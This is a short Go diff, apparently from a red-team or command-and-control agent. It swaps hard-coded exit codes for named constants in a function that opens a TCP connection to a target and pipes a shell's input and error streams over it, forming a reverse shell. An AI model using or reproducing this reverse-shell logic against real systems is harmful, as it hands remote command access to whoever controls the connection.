@@ -10,11 +10,11 @@ import (
 func spawnPtyShell(target, executor string, agent *util.AgentConfig) (int, int, error) {
 	conn, err := net.Dial("tcp", target)
 	if err != nil {
-		return agent.Pid, 1, err
+		return agent.Pid, util.ErrorExitStatus, err
 	}
 	header, err := agent.BuildSocketBeacon("piped")
 	if err != nil {
-		return agent.Pid, 1, err
+		return agent.Pid, util.ErrorExitStatus, err
 	}
 	
 	ctx, cancel := context.WithCancel(context.Background())
@@ -25,7 +25,7 @@ func spawnPtyShell(target, executor string, agent *util.AgentConfig) (int, int, 
 	shell.Stdin = conn
 	shell.Stderr = conn
 	if err = shell.Start(); err == nil {
-		return shell.Process.Pid, 0, nil
+		return shell.Process.Pid, util.SuccessExitStatus, nil
 	}
-	return agent.Pid, 1, err
+	return agent.Pid, util.ErrorExitStatus, err
 }
